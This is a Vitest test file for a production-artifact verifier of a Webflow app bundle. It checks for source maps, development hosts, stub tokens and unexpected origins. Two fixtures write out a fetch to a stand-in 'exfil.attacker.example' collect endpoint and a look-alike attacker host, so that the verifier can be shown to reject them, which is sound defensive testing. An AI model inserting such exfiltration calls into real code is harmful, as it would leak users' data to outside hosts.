import { existsSync, readFileSync, readdirSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import JSZip from "jszip";
import { describe, expect, test } from "vitest";
import { productionApiBase } from "./production-config.mjs";
import {
  inspectProductionEntries,
  inspectReviewArtifactEntries,
  verifyProductionArtifacts,
} from "./verify-production-bundle.mjs";

const readableMap = JSON.stringify({
  version: 3,
  sources: ["src/main.ts"],
  sourcesContent: ["export const ready = true;"],
  names: [],
  mappings: "",
});

function validEntries(overrides = {}) {
  return new Map(
    Object.entries({
      "bundle.js": Buffer.from(`${productionApiBase};const ready=true;`),
      "index.html": Buffer.from("<main>Preflight</main>"),
      ...overrides,
    }),
  );
}

function validReviewEntries(overrides = {}) {
  return new Map(
    Object.entries({
      "bundle.js.map": Buffer.from(readableMap),
      "package.json": Buffer.from('{"name":"preflight"}'),
      "pnpm-lock.yaml": Buffer.from("lockfileVersion: '9.0'"),
      ...overrides,
    }),
  );
}

const publicDirectory = resolve(
  dirname(fileURLToPath(import.meta.url)),
  "../public",
);
const committedBundlePath = resolve(publicDirectory, "bundle.js");
// A development build carries an inline source map. Those are produced by
// `pnpm build` during local work and are not the artifact this assertion is
// about, so it only runs against a production-shaped payload (no map at all).
const committedBundleIsProduction =
  existsSync(committedBundlePath) &&
  !readFileSync(committedBundlePath, "utf8").includes("sourceMappingURL=");

function committedPublicEntries() {
  return new Map(
    readdirSync(publicDirectory).map((name) => [
      name,
      readFileSync(resolve(publicDirectory, name)),
    ]),
  );
}

describe("production artifact verifier", () => {
  test("pins production directly to the Webflow Hosting Worker", () => {
    expect(productionApiBase).toBe(
      "https://webflow-app-review-preflight.webflow-inc.workers.dev",
    );
  });

  test("accepts a minified production payload with no source map", () => {
    expect(inspectProductionEntries(validEntries(), "Fixture")).toEqual([]);
  });

  test("rejects a source map or map directive in the shipped payload", () => {
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${productionApiBase};const ready=true;\n//# sourceMappingURL=bundle.js.map`,
        ),
        "bundle.js.map": Buffer.from(readableMap),
      }),
      "Fixture",
    );
    expect(problems).toEqual([
      "Fixture bundle.js references a source map",
      "Fixture ships source map bundle.js.map",
    ]);
  });

  test("ignores the word sourceMappingURL inside shipped code", () => {
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${productionApiBase};const hint="//# sourceMappingURL= comments are flagged";`,
        ),
      }),
      "Fixture",
    );
    expect(problems).toEqual([]);
  });

  test("requires the private review ZIP to carry the map, package.json, and a lockfile", () => {
    expect(inspectReviewArtifactEntries(validReviewEntries(), "Review")).toEqual([]);

    const incomplete = validReviewEntries();
    incomplete.delete("package.json");
    incomplete.delete("pnpm-lock.yaml");
    expect(inspectReviewArtifactEntries(incomplete, "Review")).toEqual([
      "Review is missing package.json",
      "Review is missing a lockfile",
    ]);
  });

  test.each([
    ["development React", "https://reactjs.org/link/warning"],
    ["stub identity", "test-token"],
    ["localhost", "http://localhost:8787"],
    ["loopback host", "http://127.0.0.1:8787"],
    ["tunnel host", "https://example.trycloudflare.com"],
  ])("rejects %s in any submitted text file", (_name, signature) => {
    const problems = inspectProductionEntries(
      validEntries({ "review-source.js": Buffer.from(signature) }),
      "Fixture",
    );
    expect(problems.join("\n")).toContain("review-source.js contains");
  });

  test("rejects a bundle whose only API origin extends the production host", () => {
    const attackerBase = `${productionApiBase}.attacker.example`;
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${attackerBase};const ready=true;`,
        ),
      }),
      "Fixture",
    );
    expect(problems.join("\n")).toContain(
      `does not bind the production API origin ${productionApiBase}`,
    );
    expect(problems.join("\n")).toContain(
      `contains unexpected absolute origin ${attackerBase}`,
    );
  });

  test("rejects an extra unexpected absolute origin alongside the production one", () => {
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${productionApiBase};fetch("https://exfil.attacker.example/collect");`,
        ),
      }),
      "Fixture",
    );
    expect(problems).toEqual([
      "Fixture bundle.js contains unexpected absolute origin https://exfil.attacker.example",
    ]);
  });

  test("accepts documented inert origin literals alongside the production origin", () => {
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${productionApiBase};const ns="http://www.w3.org/2000/svg";` +
            `const err="https://reactjs.org/docs/error-decoder.html?invariant=1";` +
            `const hint="https://app-review-sandbox.webflow.io";`,
        ),
      }),
      "Fixture",
    );
    expect(problems).toEqual([]);
  });

  test.skipIf(!committedBundleIsProduction)(
    "accepts the checked-in production payload",
    () => {
      expect(
        inspectProductionEntries(committedPublicEntries(), "Public payload"),
      ).toEqual([]);
    },
  );

  test("rejects a missing or unreadable review source map", () => {
    const missing = validReviewEntries();
    missing.delete("bundle.js.map");
    expect(inspectReviewArtifactEntries(missing, "Review").join("\n")).toContain(
      "missing bundle.js.map",
    );

    const invalid = validReviewEntries({ "bundle.js.map": Buffer.from("{not-json") });
    expect(inspectReviewArtifactEntries(invalid, "Review").join("\n")).toContain(
      "not valid JSON",
    );
  });

  test("inspects the generated archives rather than trusting the public directory", async () => {
    const temporaryRoot = await mkdtemp(
      resolve(tmpdir(), "preflight-artifact-verifier-"),
    );
    const publicDirectory = resolve(temporaryRoot, "public");
    const archivePath = resolve(temporaryRoot, "bundle.zip");
    const reviewArtifactPath = resolve(temporaryRoot, "review-artifact.zip");
    const publicFiles = validEntries({
      "styles.css": Buffer.from("body{}"),
    });

    async function writeZip(path, entries) {
      const zip = new JSZip();
      for (const [name, contents] of entries) zip.file(name, contents);
      await writeFile(path, await zip.generateAsync({ type: "nodebuffer" }));
    }

    try {
      await mkdir(publicDirectory);
      for (const [name, contents] of publicFiles) {
        await writeFile(resolve(publicDirectory, name), contents);
      }
      const archived = new Map([...publicFiles, ["webflow.json", Buffer.from("{}")]]);
      await writeZip(reviewArtifactPath, validReviewEntries());

      await writeZip(
        archivePath,
        new Map([...archived, ["bundle.js.map", Buffer.from(readableMap)]]),
      );
      await expect(
        verifyProductionArtifacts({ publicDirectory, archivePath, reviewArtifactPath }),
      ).rejects.toThrow("Archive ships source map bundle.js.map");

      await writeZip(archivePath, archived);
      await expect(
        verifyProductionArtifacts({ publicDirectory, archivePath, reviewArtifactPath }),
      ).resolves.toMatchObject({
        archiveFiles: 4,
        publicFiles: 3,
      });
    } finally {
      await rm(temporaryRoot, { recursive: true, force: true });
    }
  });
});
